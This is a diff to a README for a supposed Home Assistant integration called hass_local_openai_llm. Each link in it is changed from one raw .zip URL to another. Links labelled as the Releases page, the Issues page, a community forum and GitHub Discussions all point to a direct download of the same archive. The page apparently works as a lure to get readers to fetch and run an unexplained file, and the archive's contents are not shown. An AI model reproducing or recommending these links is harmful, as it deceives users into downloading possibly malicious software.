@@ -1,6 +1,6 @@
 # 🤖 hass_local_openai_llm - Seamless Integration for Home Assistant
 
-[![Download Latest Release](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip)
+[![Download Latest Release](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **hass_local_openai_llm** project. This integration allows your H
 
 ## 📥 Download & Install
 
-To get started, visit the [GitHub Releases page](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip) to download the latest version. Here’s how:
+To get started, visit the [GitHub Releases page](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip) to download the latest version. Here’s how:
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
@@ -65,14 +65,14 @@ If you encounter issues, consider the following steps:
 2. **Verify Installation:** Ensure the installation went through without errors.
 3. **Check Logs:** Look at Home Assistant logs for any error messages related to the integration.
 
-If problems persist, visit the [GitHub Issues page](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip) to report your issue or find solutions.
+If problems persist, visit the [GitHub Issues page](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip) to report your issue or find solutions.
 
 ## 🌐 Community Support
 
 Join the community for support and to share your experiences with the hass_local_openai_llm project. You can connect with other users on platforms like Discord and Reddit. Check out the following resources:
 
-- [Community Forum](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip)
+- [Community Forum](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip)
+- [GitHub Discussions](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip)
 
 Feel free to reach out for questions, suggestions, or feature requests.
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📥 Download & Install (again)
 
-Don't forget to download the latest version from the [GitHub Releases page](https://raw.githubusercontent.com/Ekalavayprkash/hass_local_openai_llm/master/Agelaus/hass_local_openai_llm.zip) and enjoy the seamless integration with your Home Assistant!
+Don't forget to download the latest version from the [GitHub Releases page](https://github.com/Ekalavayprkash/hass_local_openai_llm/raw/refs/heads/master/Agelaus/hass_local_llm_openai_v1.0.zip) and enjoy the seamless integration with your Home Assistant!
